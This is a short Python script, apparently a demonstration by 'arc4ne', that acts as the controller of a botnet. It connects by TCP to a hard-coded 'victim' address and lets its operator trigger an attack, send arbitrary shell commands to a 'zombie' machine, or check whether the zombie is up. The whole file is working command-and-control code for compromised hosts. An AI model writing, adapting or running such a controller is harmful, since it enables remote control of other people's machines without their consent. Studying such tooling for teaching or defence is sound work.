import socket
import os

HOST = "192.168.1.4"  # The victim's hostname or IP address
PORT = 7777        # The port used by the server

def command(command):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((HOST, PORT))
        except:
            print("[!] Zombie is disconnected...")
        s.sendall(command.encode('utf-8'))
        data = s.recv(1024)
        print('\n[+] Received: ', data.decode('utf-8'))
        input()
        # print("Closing socket")
        s.close()
        return

com = '0' # Apologies for using this kind of logic lol
ch = 'y'
banner = '''
                    *********************************
                    *    Controller by arc4ne       *
                    *  Demonstrating CnC for Zombies*
                    *********************************
        '''

while com != '4':
	os.system("clear")
	print(banner)
	print('\n')
	print("#"*13+" Welcome to Controller "+"#"*13)
	print("\n")
	print("[1] To Attack the Target")
	print("[2] To execute a command on Target machine")
	print("[3] To Check if the Zombie is up")
	print("[4] To Exit")
	print("\n")
	com = input("[+] Choose your Action: ")
	if com == '1':
		command("Commence the Attack")

	elif com == '2':
		while ch!='n':
			code = input("[+] Enter command to execute on zombie machine: ")
			command("Command #"+code+"$")
			ch = input("[+] Execute more commands? (y/n) ")
		ch ='y'

	elif com == '3':
		command("Check the Status")

	elif com == '4':
		print("[!] Exiting the controller....")

	else:
		print("[!] Enter correct choice!")
